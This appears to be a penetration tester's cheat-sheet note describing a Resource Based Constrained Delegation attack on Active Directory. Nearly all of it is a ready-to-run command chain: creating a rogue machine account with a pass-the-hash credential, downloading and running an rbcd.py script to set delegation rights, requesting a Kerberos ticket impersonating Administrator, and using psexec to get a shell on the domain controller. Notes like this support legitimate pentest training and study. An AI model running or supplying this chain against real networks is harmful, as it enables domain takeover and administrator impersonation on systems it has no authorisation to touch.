# Resource Based Constrained Delegation


If a domain user has [[GenericAll]] permissions they can do this:
```bash
# Kali - create a new machine account on the domain
impacket-addcomputer $domain.local/$user -dc-ip $domaincontroller-ip $domaincontroller-ip  -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'
# Target - Verify 
PS > get-adcomputer attack

# Kali - Get delegation rights script to manage delegation rights
wget https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py
# set sDS-AllowedToActOnBehalfOfOtherIdentity on new machine account
sudo python3 rbcd.py -dc-ip $domaincontroller-ip -t $target -f 'ATTACK' -hashes :$hash $domain\$user

# Target - Verify
PS> Get-adcomputer resourcedc -properties msds-allowedtoactonbehalfofotheridentity |select -expand msds-allowedtoactonbehalfofotheridentity

# Kali - Get administrator service ticket
impacket-getST -spn cifs/$dc.$domain.local $domain/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip $domaincontroller-ip 
# export the KRB55CCNAME so that impacket can load the .ccache file
export KRB5CCNAME=./Administrator.ccache
# Append /etc/hosts file with 
sudo sh -c 'echo "$domaincontroller-ip $domain.local dc.$domain.local" >> /etc/hosts'
# Psexc in!
sudo impacket-psexec -k -no-pass $dc.$domain.local -dc-ip $domaincontroller-ip
```